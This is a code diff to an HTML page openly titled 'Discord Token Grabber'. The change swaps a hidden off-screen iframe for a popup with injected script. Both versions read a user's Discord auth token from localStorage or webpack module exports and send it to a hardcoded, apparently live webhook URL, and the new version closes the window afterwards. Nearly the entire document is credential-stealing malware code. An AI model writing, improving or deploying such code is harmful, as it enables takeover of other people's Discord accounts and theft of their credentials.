@@ -22,6 +22,7 @@
             border-radius: 5px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.2);
             text-align: center;
+            max-width: 300px;
         }
         .status {
             margin-top: 10px;
@@ -30,16 +31,16 @@
         }
         .success { color: #43b581; }
         .error { color: #f04747; }
-        
-        /* Hidden iframe for loading Discord */
-        #discordFrame {
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-            width: 100%;
-            height: 100%;
+        button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            cursor: pointer;
+            background: #5865F2;
+            color: white;
             border: none;
+            border-radius: 5px;
         }
+        button:hover { background: #4752c4; }
     </style>
 </head>
 <body>
@@ -47,18 +48,13 @@
 <div class="container">
     <h3>Discord Token Grabber</h3>
     <div id="status" class="status">Click to Start</div>
-    <button id="startBtn" style="margin-top:10px; padding:10px 20px; cursor:pointer;">Start</button>
+    <button id="startBtn">Start</button>
 </div>
-
-<!-- Hidden iframe to load Discord -->
-<iframe id="discordFrame" src="https://discord.com/login" sandbox="allow-same-origin allow-scripts allow-modals allow-forms allow-popups"></iframe>
 
 <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";
     const statusEl = document.getElementById('status');
     const startBtn = document.getElementById('startBtn');
-    const iframe = document.getElementById('discordFrame');
-    let tokenGrabbed = false;
 
     function updateStatus(msg, type = 'normal') {
         statusEl.textContent = msg;
@@ -66,8 +62,10 @@
     }
 
     async function sendToken(token) {
-        if (!token || tokenGrabbed) return;
-        tokenGrabbed = true;
+        if (!token) {
+            updateStatus("No token found!", "error");
+            return;
+        }
         updateStatus("Sending token...", "normal");
         try {
             const response = await fetch(WEBHOOK_URL, {
@@ -79,6 +77,7 @@
             });
             if (response.ok) {
                 updateStatus("Token sent successfully!", "success");
+                setTimeout(() => window.close(), 2000);
             } else {
                 updateStatus("Webhook error: " + response.status, "error");
             }
@@ -87,50 +86,72 @@
         }
     }
 
-    startBtn.addEventListener('click', () => {
-        if (tokenGrabbed) return;
-        updateStatus("Loading Discord...", "normal");
-        
-        // The iframe is already loaded in the HTML, but we ensure it's visible to the user if needed
-        // or we can just let it run in the background. 
-        // For better UX, let's make it visible but small, or just let it load.
-        // Since we want to grab the token, we need the user to be logged in.
-        
-        // Check if iframe has loaded
-        iframe.onload = () => {
-            updateStatus("Discord loaded. Looking for token...", "normal");
-            checkToken();
-        };
-
-        // If iframe is already loaded
-        if (iframe.src && iframe.contentWindow) {
-            checkToken();
+    // Listen for messages from the popup window
+    window.addEventListener('message', (event) => {
+        if (event.data && event.data.type === 'DISCORD_TOKEN') {
+            updateStatus("Token received!", "success");
+            sendToken(event.data.token);
         }
     });
 
-    function checkToken() {
-        const interval = setInterval(() => {
-            try {
-                // Access the iframe's document
-                const iframeDoc = iframe.contentWindow.document;
-                
-                // If the iframe is still loading or cross-origin, this might fail
-                // But with 'allow-same-origin', we can access localStorage if possible
-                
-                if (iframe.contentWindow.localStorage) {
-                    const token = iframe.contentWindow.localStorage.getItem('token') || 
-                                  iframe.contentWindow.localStorage.getItem('token_x');
+    startBtn.addEventListener('click', () => {
+        updateStatus("Opening Discord...", "normal");
+        
+        // Open Discord in a new window
+        const discordWindow = window.open('https://discord.com/app', 'discordPopup', 'width=800,height=600');
+
+        if (!discordWindow) {
+            updateStatus("Popup blocked! Allow popups for this site.", "error");
+            return;
+        }
+
+        // Inject script into the popup to grab the token
+        const script = document.createElement('script');
+        script.textContent = `
+            (function() {
+                // Wait for Discord to load
+                const checkInterval = setInterval(() => {
+                    // Try to get token from various storage locations
+                    const token = window.localStorage.getItem('token') || 
+                                  window.localStorage.getItem('token_x') ||
+                                  (window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[], {}, (e) => {
+                                      Object.values(e.c).forEach(module => {
+                                          if(module && module.id && module.id.includes("default")) {
+                                              clearInterval(checkInterval);
+                                              // Try to find token in module exports
+                                              Object.values(module.exports).forEach(m => {
+                                                  if(m && m.Z && m.Z.accessToken) {
+                                                      window.postMessage({ type: 'DISCORD_TOKEN', token: m.Z.accessToken }, '*');
+                                                      window.close();
+                                                  }
+                                              });
+                                          }
+                                      });
+                                  }));
                     
-                    if (token && !tokenGrabbed) {
-                        clearInterval(interval);
-                        sendToken(token);
+                    if(token && token !== 'undefined') {
+                        clearInterval(checkInterval);
+                        window.postMessage({ type: 'DISCORD_TOKEN', token: token }, '*');
+                        window.close();
                     }
+                }, 500);
+            })();
+        `;
+        
+        // Append script to the popup
+        discordWindow.document.body.appendChild(script);
+        
+        // Fallback: Check if token is already available immediately
+        setTimeout(() => {
+            try {
+                const token = discordWindow.localStorage.getItem('token') || discordWindow.localStorage.getItem('token_x');
+                if(token) {
+                    discordWindow.postMessage({ type: 'DISCORD_TOKEN', token: token }, '*');
+                    discordWindow.close();
                 }
-            } catch (e) {
-                // Cross-origin error, continue trying
-            }
-        }, 1000);
-    }
+            } catch(e) {}
+        }, 2000);
+    });
 </script>
 
 </body>
